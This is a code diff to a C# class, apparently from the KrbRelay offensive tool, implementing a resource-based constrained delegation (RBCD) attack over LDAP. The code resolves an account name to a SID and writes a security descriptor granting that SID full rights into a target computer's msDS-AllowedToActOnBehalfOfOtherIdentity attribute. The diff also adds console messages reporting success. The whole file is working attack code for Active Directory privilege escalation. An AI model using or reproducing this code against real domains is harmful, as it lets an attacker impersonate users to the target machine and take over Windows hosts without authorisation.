@@ -1,23 +1,45 @@
 ﻿using System;
 using System.Security.AccessControl;
-using static KrbRelay.Natives;
+using System.Security.Principal;
 
 namespace KrbRelay.Clients.Attacks.Ldap
 {
     internal class RBCD
     {
-        public static LdapStatus attack(IntPtr ld, string sid, string computername = null)
+        public static LdapStatus attack(IntPtr ld, string nameOrSid, string computername = null)
         {
-            if (!sid.StartsWith("S-1-5-"))
-            {
-                sid = Generic.getPropertyValue(ld, sid, "objectSid");
+            if (!nameOrSid.StartsWith("S-1-5-")) {
+                if (!nameOrSid.StartsWith("S-"))
+                {
+                    // Is this safe to assume?
+                    if (!nameOrSid.EndsWith("$"))
+                    {
+                        nameOrSid += "$";
+                    }
+
+                    var sidBytes = Generic.GetAttributeWithAccountName(ld, nameOrSid, "objectSid")[0];
+                    nameOrSid = new SecurityIdentifier(sidBytes, 0).ToString();
+                }
             }
-            string dn = Generic.getMachineDN(ld, computername);
-            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")";
+
+            string dn = Generic.GetDistinguishedNameFromAccountName(ld, computername, true);
+            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + nameOrSid + ")";
             RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
             byte[] value = new byte[sd.BinaryLength];
             sd.GetBinaryForm(value, 0);
-            return Generic.setAttribute(ld, "msDS-AllowedToActOnBehalfOfOtherIdentity", value, dn);
+            var result = Generic.SetAttribute(ld, dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", value);
+
+            if (result == LdapStatus.Success)
+            {
+                Console.WriteLine("[+] Successfully configured RBCD");
+                Console.WriteLine(" |- DN:  {0}", dn);
+                Console.WriteLine(" |- SID: {0}", nameOrSid);
+            } else
+            {
+                Console.WriteLine("[!] Failed to configure RBCD: {0}", result);
+            }
+
+            return result;
         }
     }
 }
